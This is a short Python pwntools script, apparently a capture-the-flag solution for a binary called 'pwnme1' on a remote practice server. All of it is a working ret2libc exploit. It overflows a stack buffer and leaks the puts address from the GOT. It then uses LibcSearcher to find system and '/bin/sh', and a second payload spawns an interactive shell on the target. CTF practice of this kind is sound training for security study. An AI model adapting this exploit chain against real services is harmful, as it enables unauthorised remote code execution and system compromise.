# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
proc_name = 'pwnme1'
#p = process(proc_name)
p = remote('node3.buuoj.cn', 28114)
elf = ELF(proc_name)

padding = 'a' * 0xA4
fake_ebp = 'jkjk'
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload1 = padding + fake_ebp + p32(puts_plt) + p32(main_addr) + p32(puts_got)

p.sendline('5')
p.recvuntil('fruit:')
p.sendline(payload1)

puts_addr = u32(p.recvuntil('\xf7')[-4:])
log.success('puts_addr :' + hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

payload2 = padding + fake_ebp + p32(system_addr) + fake_ebp + p32(str_bin_sh)
p.sendline('5')
p.recvuntil('fruit:')
p.sendline(payload2)
p.interactive()

